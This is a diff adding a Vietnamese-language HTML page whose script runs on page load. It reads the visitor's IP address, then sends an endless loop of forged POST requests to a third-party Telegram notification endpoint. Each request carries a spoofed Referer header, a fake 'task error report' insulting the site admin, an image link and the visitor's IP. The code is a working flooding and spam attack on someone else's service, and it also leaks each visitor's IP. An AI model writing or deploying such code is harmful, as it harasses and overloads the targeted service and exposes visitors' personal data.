@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tự Động Gửi Yêu Cầu Với IP Người Dùng</title>
+    <script>
+        let sending = true; // Biến kiểm soát việc gửi yêu cầu
+        let userIP = "Không xác định"; // Lưu IP người dùng
+
+        // Hàm lấy IP hiện tại của người dùng
+        async function getUserIP() {
+            try {
+                const response = await fetch("https://api64.ipify.org?format=json");
+                const data = await response.json();
+                userIP = data.ip;
+                console.log("IP người dùng:", userIP);
+            } catch (error) {
+                console.error("Không thể lấy IP người dùng:", error);
+            }
+        }
+
+        // Hàm gửi yêu cầu
+        async function sendRequest() {
+            const url = "https://firet.io/send_telegram.php";
+            const headers = {
+                "Content-Type": "application/json",
+                "Referer": "https://firet.io/hdvl.php",
+            };
+
+            while (sending) {
+                const payload = {
+                    message: `🚨 *Người dùng nhấn Báo lỗi nhiệm vụ*\n\n📝 *Từ khóa:* Địt Mẹ Admin\n🔗 *Link ảnh:* https://i.imgur.com/AUJnYW7.png\n🌍 *IP người dùng:* ${userIP}`
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: "POST",
+                        headers: headers,
+                        body: JSON.stringify(payload)
+                    });
+
+                    const data = await response.text();
+                    console.log("Yêu cầu gửi thành công:", data);
+                } catch (error) {
+                    console.error("Lỗi khi gửi yêu cầu:", error);
+                }
+            }
+        }
+
+        // Tự động chạy khi mở trang
+        window.onload = async function() {
+            await getUserIP(); // Lấy IP trước khi gửi yêu cầu
+            sendRequest(); // Bắt đầu gửi yêu cầu
+        };
+    </script>
+</head>
+<body>
+    <h1>Trang đang tự động gửi yêu cầu</h1>
+    <p>Yêu cầu đang được gửi liên tục đến server với IP hiện tại...</p>
+</body>
+</html>
